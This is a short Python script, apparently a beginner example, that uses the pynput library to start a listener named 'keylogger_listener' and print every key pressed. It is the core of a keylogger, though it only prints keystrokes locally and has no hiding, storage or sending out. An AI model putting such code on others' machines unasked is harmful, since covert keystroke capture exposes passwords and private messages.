import pynput.keyboard


def callback_function(key):
    print(key)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()